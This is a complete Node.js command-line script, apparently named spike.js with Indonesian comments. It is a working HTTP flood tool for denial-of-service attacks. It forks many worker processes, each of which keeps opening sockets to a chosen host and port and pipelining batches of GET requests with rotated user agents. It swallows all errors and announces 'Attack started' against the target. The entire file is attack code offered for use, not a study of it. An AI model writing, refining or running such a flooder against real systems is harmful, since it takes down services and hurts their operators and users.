const fs = require("fs");
const url = require("url");
const net = require("net");
const cluster = require("cluster");

// Validasi jumlah argumen
if (process.argv.length <= 5) {
  console.log("Usage: node spike.js <target> <port> <threads> <time>");
  console.log("Example:");
  console.log("  node spike.js 1.2.3.4 80 100 60");
  console.log("  node spike.js example.com 8080 150 90");
  console.log("  node spike.js http://example.com 443 200 120");
  process.exit(-1);
}

let target = process.argv[2];
let port = parseInt(process.argv[3]);
let threads = parseInt(process.argv[4]);
let time = parseInt(process.argv[5]);

// Tambahkan http:// jika tidak ada
if (!/^https?:\/\//i.test(target)) {
  target = "http://" + target;
}

const parsed = url.parse(target);
const host = parsed.hostname || parsed.host;
const path = parsed.path || "/";

// Cegah terlalu banyak event listeners
require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

// Tangani error tanpa crash
process.on("uncaughtException", function (e) {});
process.on("unhandledRejection", function (e) {});

let userAgents = [];
try {
  userAgents = fs.readFileSync("ua.txt", "utf8").split("\n");
} catch (err) {
  console.error("\x1b[31mMissing ua.txt file:\n" + err);
  process.exit(-1);
}

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  console.clear();
  console.log(`\x1b[33m(!) \x1b[37mAttack started to \x1b[32m${host}:${port}`);
  console.log(
    `\x1b[36mThreads:\x1b[37m ${threads} | \x1b[36mTime:\x1b[37m ${time}s`
  );
  setTimeout(() => {
    process.exit(1);
  }, time * 1000);
} else {
  startFlood();
}

function startFlood() {
  const int = setInterval(() => {
    const s = new net.Socket();
    s.connect(port, host);
    s.setTimeout(10000);

    for (let i = 0; i < 64; i++) {
      const req =
        "GET " +
        path +
        " HTTP/1.1\r\n" +
        "Host: " +
        host +
        "\r\n" +
        "User-Agent: " +
        userAgents[Math.floor(Math.random() * userAgents.length)] +
        "\r\n" +
        "Accept: */*\r\n" +
        "Accept-Language: en-US,en;q=0.9\r\n" +
        "Accept-Encoding: gzip, deflate\r\n" +
        "Connection: Keep-Alive\r\n\r\n";

      s.write(req);
    }

    s.on("data", () => {
      setTimeout(() => {
        s.destroy();
      }, 5000);
    });

    s.on("error", () => {
      s.destroy();
    });

    s.on("timeout", () => {
      s.destroy();
    });
  });

  setTimeout(() => clearInterval(int), time * 1000);
}
